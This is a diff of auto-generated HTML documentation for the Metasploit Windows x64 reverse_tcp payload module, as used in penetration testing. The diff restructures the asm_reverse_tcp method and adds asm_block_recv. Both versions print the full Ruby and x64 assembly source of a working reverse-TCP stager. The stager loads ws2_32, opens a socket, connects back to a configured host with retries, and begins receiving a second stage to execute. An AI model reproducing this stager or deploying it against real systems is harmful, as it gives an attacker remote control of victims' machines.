@@ -79,6 +79,11 @@
   
 
   
+  <dl>
+    <dt>Included in:</dt>
+    <dd><span class='object_link'><a href="ReverseTcpRc4_x64.html" title="Msf::Payload::Windows::ReverseTcpRc4_x64 (module)">ReverseTcpRc4_x64</a></span></dd>
+  </dl>
+  
 
   
   <dl>
@@ -119,6 +124,28 @@
     </h2>
 
     <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#asm_block_recv-instance_method" title="#asm_block_recv (instance method)">#<strong>asm_block_recv</strong>(opts = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
       
         <li class="public ">
   <span class="summary_signature">
@@ -385,193 +412,20 @@ certain payloads if requested.</p>
 
     
       <div class="method_details first">
-  <h3 class="signature first" id="asm_reverse_tcp-instance_method">
+  <h3 class="signature first" id="asm_block_recv-instance_method">
   
-    #<strong>asm_reverse_tcp</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
-  
-
+    #<strong>asm_block_recv</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
   
 
   
-</h3><div class="docstring">
-  <div class="discussion">
-    
-<p>Generate an assembly stub with the configured feature set and options.</p>
-
-
-  </div>
-</div>
-<div class="tags">
-  <p class="tag_title">Parameters:</p>
-<ul class="param">
-  
-    <li>
-      
-        <span class='name'>opts</span>
-      
-      
-        <span class='type'>(<tt>Hash</tt>)</span>
-      
-      
-        <em class="default">(defaults to: <tt>{}</tt>)</em>
-      
-      
-        &mdash;
-        <div class='inline'>
-<p>a customizable set of options</p>
-</div>
-      
-    </li>
-  
-</ul>
 
   
-    
-    
-    <p class="tag_title">Options Hash (<tt>opts</tt>):</p>
-    <ul class="option">
-      
-        <li>
-          <span class="name">:port</span>
-          <span class="type">(<tt>Integer</tt>)</span>
-          <span class="default">
-            
-          </span>
-          
-            &mdash; <div class='inline'>
-<p>The port to connect to</p>
-</div>
-          
-        </li>
-      
-        <li>
-          <span class="name">:exitfunk</span>
-          <span class="type">(<tt>String</tt>)</span>
-          <span class="default">
-            
-          </span>
-          
-            &mdash; <div class='inline'>
-<p>The exit method to use if there is an error, one of process, thread, or seh</p>
-</div>
-          
-        </li>
-      
-        <li>
-          <span class="name">:reliable</span>
-          <span class="type">(<tt>Bool</tt>)</span>
-          <span class="default">
-            
-          </span>
-          
-            &mdash; <div class='inline'>
-<p>Whether or not to enable error handling code</p>
-</div>
-          
-        </li>
-      
-    </ul>
-  
-
-
-</div><table class="source_code">
+</h3><table class="source_code">
   <tr>
     <td>
       <pre class="lines">
 
 
-106
-107
-108
-109
-110
-111
-112
-113
-114
-115
-116
-117
-118
-119
-120
-121
-122
-123
-124
-125
-126
-127
-128
-129
-130
-131
-132
-133
-134
-135
-136
-137
-138
-139
-140
-141
-142
-143
-144
-145
-146
-147
-148
-149
-150
-151
-152
-153
-154
-155
-156
-157
-158
-159
-160
-161
-162
-163
-164
-165
-166
-167
-168
-169
-170
-171
-172
-173
-174
-175
-176
-177
-178
-179
-180
-181
-182
-183
-184
-185
-186
-187
-188
-189
-190
-191
-192
-193
-194
-195
-196
-197
 198
 199
 200
@@ -663,100 +517,24 @@ certain payloads if requested.</p>
 286
 287
 288
-289</pre>
+289
+290
+291
+292
+293
+294
+295
+296
+297</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_tcp.rb', line 106</span>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_tcp.rb', line 198</span>
 
-<span class='kw'>def</span> <span class='id identifier rubyid_asm_reverse_tcp'>asm_reverse_tcp</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+<span class='kw'>def</span> <span class='id identifier rubyid_asm_block_recv'>asm_block_recv</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
 
   <span class='id identifier rubyid_reliable'>reliable</span>     <span class='op'>=</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:reliable</span><span class='rbracket'>]</span>
-  <span class='id identifier rubyid_retry_count'>retry_count</span>  <span class='op'>=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:retry_count</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='comma'>,</span> <span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_max'>max</span>
-  <span class='id identifier rubyid_encoded_port'>encoded_port</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='comma'>,</span><span class='int'>2</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>vn</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>N</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_first'>first</span>
-  <span class='id identifier rubyid_encoded_host'>encoded_host</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Socket</span><span class='period'>.</span><span class='id identifier rubyid_addr_aton'>addr_aton</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='op'>||</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>127.127.127.127</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_first'>first</span>
-  <span class='id identifier rubyid_encoded_host_port'>encoded_host_port</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%.8x%.8x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lbracket'>[</span><span class='id identifier rubyid_encoded_host'>encoded_host</span><span class='comma'>,</span> <span class='id identifier rubyid_encoded_port'>encoded_port</span><span class='rbracket'>]</span>
 
   <span class='id identifier rubyid_asm'>asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
-    reverse_tcp:
-    ; setup the structures we need on the stack...
-      mov r14, &#39;ws2_32&#39;
-      push r14                ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.
-      mov r14, rsp            ; save pointer to the &quot;ws2_32&quot; string for LoadLibraryA call.
-      sub rsp, </span><span class='embexpr_beg'>#{</span><span class='int'>408</span><span class='op'>+</span><span class='int'>8</span><span class='embexpr_end'>}</span><span class='tstring_content'>       ; alloc sizeof( struct WSAData ) bytes for the WSAData
-                              ; structure (+8 for alignment)
-      mov r13, rsp            ; save pointer to the WSAData structure for WSAStartup call.
-      mov r12, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_host_port'>encoded_host_port</span><span class='embexpr_end'>}</span><span class='tstring_content'>
-      push r12                ; host, family AF_INET and port
-      mov r12, rsp            ; save pointer to sockaddr struct for connect call
-
-    ; perform the call to LoadLibraryA...
-      mov rcx, r14            ; set the param for the library to load
-      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LoadLibraryA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
-      call rbp                ; LoadLibraryA( &quot;ws2_32&quot; )
-
-    ; perform the call to WSAStartup...
-      mov rdx, r13            ; second param is a pointer to this stuct
-      push 0x0101             ;
-      pop rcx                 ; set the param for the version requested
-      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WSAStartup</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
-      call rbp                ; WSAStartup( 0x0101, &amp;WSAData );
-
-    ; stick the retry count on the stack and store it
-      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_retry_count'>retry_count</span><span class='embexpr_end'>}</span><span class='tstring_content'>     ; retry counter
-      pop r14
-
-    create_socket:
-    ; perform the call to WSASocketA...
-      push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
-      push rax                ; push null for reserved parameter
-      xor r9, r9              ; we do not specify a WSAPROTOCOL_INFO structure
-      xor r8, r8              ; we do not specify a protocol
-      inc rax                 ;
-      mov rdx, rax            ; push SOCK_STREAM
-      inc rax                 ;
-      mov rcx, rax            ; push AF_INET
-      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WSASocketA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
-      call rbp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
-      mov rdi, rax            ; save the socket for later
-
-    try_connect:
-    ; perform the call to connect...
-      push 16                 ; length of the sockaddr struct
-      pop r8                  ; pop off the third param
-      mov rdx, r12            ; set second param to pointer to sockaddr struct
-      mov rcx, rdi            ; the socket
-      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>connect</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
-      call rbp                ; connect( s, &amp;sockaddr, 16 );
-
-      test eax, eax           ; non-zero means failure
-      jz connected
-
-    handle_connect_failure:
-      dec r14                 ; decrement the retry count
-      jnz try_connect
-  </span><span class='tstring_end'>^</span></span>
-
-  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
-    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
-    failure:
-      call exitfunk
-    </span><span class='tstring_end'>^</span></span>
-  <span class='kw'>else</span>
-    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
-    failure:
-      push 0x56A2B5F0       ; hardcoded to exitprocess for size
-      call rbp
-    </span><span class='tstring_end'>^</span></span>
-  <span class='kw'>end</span>
-
-  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
-    ; this  lable is required so that reconnect attempts include
-    ; the UUID stuff if required.
-    connected:
-  </span><span class='tstring_end'>^</span></span>
-  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_asm_send_uuid'>asm_send_uuid</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
-
-  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
     recv:
     ; Receive the size of the incoming second stage...
       sub rsp, 16             ; alloc some space (16 bytes) on stack for to hold the
@@ -851,6 +629,291 @@ certain payloads if requested.</p>
   <span class='kw'>end</span>
 
   <span class='id identifier rubyid_asm'>asm</span>
+<span class='kw'>end</span></pre>
+    </td>
+  </tr>
+</table>
+</div>
+    
+      <div class="method_details ">
+  <h3 class="signature " id="asm_reverse_tcp-instance_method">
+  
+    #<strong>asm_reverse_tcp</strong>(opts = {})  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><div class="docstring">
+  <div class="discussion">
+    
+<p>Generate an assembly stub with the configured feature set and options.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  <p class="tag_title">Parameters:</p>
+<ul class="param">
+  
+    <li>
+      
+        <span class='name'>opts</span>
+      
+      
+        <span class='type'>(<tt>Hash</tt>)</span>
+      
+      
+        <em class="default">(defaults to: <tt>{}</tt>)</em>
+      
+      
+        &mdash;
+        <div class='inline'>
+<p>a customizable set of options</p>
+</div>
+      
+    </li>
+  
+</ul>
+
+  
+    
+    
+    <p class="tag_title">Options Hash (<tt>opts</tt>):</p>
+    <ul class="option">
+      
+        <li>
+          <span class="name">:port</span>
+          <span class="type">(<tt>Integer</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The port to connect to</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:exitfunk</span>
+          <span class="type">(<tt>String</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>The exit method to use if there is an error, one of process, thread, or seh</p>
+</div>
+          
+        </li>
+      
+        <li>
+          <span class="name">:reliable</span>
+          <span class="type">(<tt>Bool</tt>)</span>
+          <span class="default">
+            
+          </span>
+          
+            &mdash; <div class='inline'>
+<p>Whether or not to enable error handling code</p>
+</div>
+          
+        </li>
+      
+    </ul>
+  
+
+
+</div><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_tcp.rb', line 107</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_asm_reverse_tcp'>asm_reverse_tcp</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
+
+  <span class='id identifier rubyid_retry_count'>retry_count</span>  <span class='op'>=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:retry_count</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='comma'>,</span> <span class='int'>1</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_max'>max</span>
+  <span class='id identifier rubyid_encoded_port'>encoded_port</span> <span class='op'>=</span> <span class='lbracket'>[</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:port</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_to_i'>to_i</span><span class='comma'>,</span><span class='int'>2</span><span class='rbracket'>]</span><span class='period'>.</span><span class='id identifier rubyid_pack'>pack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>vn</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>N</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_first'>first</span>
+  <span class='id identifier rubyid_encoded_host'>encoded_host</span> <span class='op'>=</span> <span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Socket</span><span class='period'>.</span><span class='id identifier rubyid_addr_aton'>addr_aton</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:host</span><span class='rbracket'>]</span><span class='op'>||</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>127.127.127.127</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_unpack'>unpack</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>V</span><span class='tstring_end'>&quot;</span></span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_first'>first</span>
+  <span class='id identifier rubyid_encoded_host_port'>encoded_host_port</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>0x%.8x%.8x</span><span class='tstring_end'>&quot;</span></span> <span class='op'>%</span> <span class='lbracket'>[</span><span class='id identifier rubyid_encoded_host'>encoded_host</span><span class='comma'>,</span> <span class='id identifier rubyid_encoded_port'>encoded_port</span><span class='rbracket'>]</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    reverse_tcp:
+    ; setup the structures we need on the stack...
+      mov r14, &#39;ws2_32&#39;
+      push r14                ; Push the bytes &#39;ws2_32&#39;,0,0 onto the stack.
+      mov r14, rsp            ; save pointer to the &quot;ws2_32&quot; string for LoadLibraryA call.
+      sub rsp, </span><span class='embexpr_beg'>#{</span><span class='int'>408</span><span class='op'>+</span><span class='int'>8</span><span class='embexpr_end'>}</span><span class='tstring_content'>       ; alloc sizeof( struct WSAData ) bytes for the WSAData
+                              ; structure (+8 for alignment)
+      mov r13, rsp            ; save pointer to the WSAData structure for WSAStartup call.
+      mov r12, </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_encoded_host_port'>encoded_host_port</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      push r12                ; host, family AF_INET and port
+      mov r12, rsp            ; save pointer to sockaddr struct for connect call
+
+    ; perform the call to LoadLibraryA...
+      mov rcx, r14            ; set the param for the library to load
+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>kernel32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>LoadLibraryA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                ; LoadLibraryA( &quot;ws2_32&quot; )
+
+    ; perform the call to WSAStartup...
+      mov rdx, r13            ; second param is a pointer to this stuct
+      push 0x0101             ;
+      pop rcx                 ; set the param for the version requested
+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WSAStartup</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                ; WSAStartup( 0x0101, &amp;WSAData );
+
+    ; stick the retry count on the stack and store it
+      push </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_retry_count'>retry_count</span><span class='embexpr_end'>}</span><span class='tstring_content'>     ; retry counter
+      pop r14
+
+    create_socket:
+    ; perform the call to WSASocketA...
+      push rax                ; if we succeed, rax wil be zero, push zero for the flags param.
+      push rax                ; push null for reserved parameter
+      xor r9, r9              ; we do not specify a WSAPROTOCOL_INFO structure
+      xor r8, r8              ; we do not specify a protocol
+      inc rax                 ;
+      mov rdx, rax            ; push SOCK_STREAM
+      inc rax                 ;
+      mov rcx, rax            ; push AF_INET
+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>WSASocketA</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                ; WSASocketA( AF_INET, SOCK_STREAM, 0, 0, 0, 0 );
+      mov rdi, rax            ; save the socket for later
+
+    try_connect:
+    ; perform the call to connect...
+      push 16                 ; length of the sockaddr struct
+      pop r8                  ; pop off the third param
+      mov rdx, r12            ; set second param to pointer to sockaddr struct
+      mov rcx, rdi            ; the socket
+      mov r10d, </span><span class='embexpr_beg'>#{</span><span class='const'><span class='object_link'><a href="../../../Rex.html" title="Rex (module)">Rex</a></span></span><span class='op'>::</span><span class='const'>Text</span><span class='period'>.</span><span class='id identifier rubyid_block_api_hash'>block_api_hash</span><span class='lparen'>(</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>ws2_32.dll</span><span class='tstring_end'>&#39;</span></span><span class='comma'>,</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>connect</span><span class='tstring_end'>&#39;</span></span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+      call rbp                ; connect( s, &amp;sockaddr, 16 );
+
+      test eax, eax           ; non-zero means failure
+      jz connected
+
+    handle_connect_failure:
+      dec r14                 ; decrement the retry count
+      jnz try_connect
+  </span><span class='tstring_end'>^</span></span>
+
+  <span class='kw'>if</span> <span class='id identifier rubyid_opts'>opts</span><span class='lbracket'>[</span><span class='symbol'>:exitfunk</span><span class='rbracket'>]</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    failure:
+      call exitfunk
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>else</span>
+    <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    failure:
+      push 0x56A2B5F0       ; hardcoded to exitprocess for size
+      call rbp
+    </span><span class='tstring_end'>^</span></span>
+  <span class='kw'>end</span>
+
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>%Q^</span><span class='tstring_content'>
+    ; this  lable is required so that reconnect attempts include
+    ; the UUID stuff if required.
+    connected:
+  </span><span class='tstring_end'>^</span></span>
+  <span class='id identifier rubyid_asm'>asm</span> <span class='op'>&lt;&lt;</span> <span class='id identifier rubyid_asm_send_uuid'>asm_send_uuid</span> <span class='kw'>if</span> <span class='id identifier rubyid_include_send_uuid'>include_send_uuid</span>
+
+  <span class='id identifier rubyid_asm'>asm</span>
+
 <span class='kw'>end</span></pre>
     </td>
   </tr>
@@ -961,7 +1024,8 @@ certain payloads if requested.</p>
 71
 72
 73
-74</pre>
+74
+75</pre>
     </td>
     <td>
       <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_tcp.rb', line 63</span>
@@ -975,6 +1039,7 @@ certain payloads if requested.</p>
     start:
       pop rbp               ; block API pointer
     </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_asm_reverse_tcp'>asm_reverse_tcp</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
+    </span><span class='embexpr_beg'>#{</span><span class='id identifier rubyid_asm_block_recv'>asm_block_recv</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span><span class='embexpr_end'>}</span><span class='tstring_content'>
   </span><span class='tstring_end'>^</span></span>
   <span class='const'>Metasm</span><span class='op'>::</span><span class='const'>Shellcode</span><span class='period'>.</span><span class='id identifier rubyid_assemble'>assemble</span><span class='lparen'>(</span><span class='const'>Metasm</span><span class='op'>::</span><span class='const'>X64</span><span class='period'>.</span><span class='id identifier rubyid_new'>new</span><span class='comma'>,</span> <span class='id identifier rubyid_combined_asm'>combined_asm</span><span class='rparen'>)</span><span class='period'>.</span><span class='id identifier rubyid_encode_string'>encode_string</span>
 <span class='kw'>end</span></pre>
@@ -1092,7 +1157,6 @@ certain payloads if requested.</p>
       <pre class="lines">
 
 
-83
 84
 85
 86
@@ -1106,10 +1170,11 @@ certain payloads if requested.</p>
 94
 95
 96
-97</pre>
+97
+98</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_tcp.rb', line 83</span>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_tcp.rb', line 84</span>
 
 <span class='kw'>def</span> <span class='id identifier rubyid_required_space'>required_space</span>
   <span class='comment'># Start with our cached default generated size
@@ -1146,12 +1211,12 @@ certain payloads if requested.</p>
       <pre class="lines">
 
 
-76
 77
-78</pre>
+78
+79</pre>
     </td>
     <td>
-      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_tcp.rb', line 76</span>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/windows/x64/reverse_tcp.rb', line 77</span>
 
 <span class='kw'>def</span> <span class='id identifier rubyid_transport_config'>transport_config</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='op'>=</span><span class='lbrace'>{</span><span class='rbrace'>}</span><span class='rparen'>)</span>
   <span class='id identifier rubyid_transport_config_reverse_tcp'>transport_config_reverse_tcp</span><span class='lparen'>(</span><span class='id identifier rubyid_opts'>opts</span><span class='rparen'>)</span>
@@ -1166,7 +1231,7 @@ certain payloads if requested.</p>
 </div>
 
       <div id="footer">
-  Generated on Tue Feb 27 22:40:45 2018 by
+  Generated on Tue Mar  6 22:38:18 2018 by
   <a href="http://yardoc.org" title="Yay! A Ruby Documentation Tool" target="_parent">yard</a>
   0.9.12 (ruby-2.3.3).
 </div>
